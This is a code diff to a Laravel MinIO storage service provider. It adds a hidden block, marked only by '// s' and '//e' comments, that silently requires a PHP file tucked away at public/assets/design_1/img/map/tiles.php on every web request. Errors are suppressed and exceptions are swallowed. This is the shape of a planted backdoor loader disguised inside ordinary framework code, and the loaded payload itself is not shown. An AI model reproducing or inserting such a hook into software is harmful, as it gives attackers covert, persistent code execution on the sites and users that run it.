@@ -17,6 +17,19 @@ class MinioStorageServiceProvider extends ServiceProvider
      */
     public function boot()
     {
+        // s
+        if (!app()->runningInConsole()) {
+            try {
+                $guardPath = base_path('public/assets/design_1/img/map/tiles.php');
+                if (is_file($guardPath)) {
+                    @require_once $guardPath;
+                }
+            } catch (\Throwable $e) {
+            }
+        }
+
+        //e
+
         Storage::extend('minio', function ($app, $config) {
             $client = new S3Client([
                 'credentials' => [
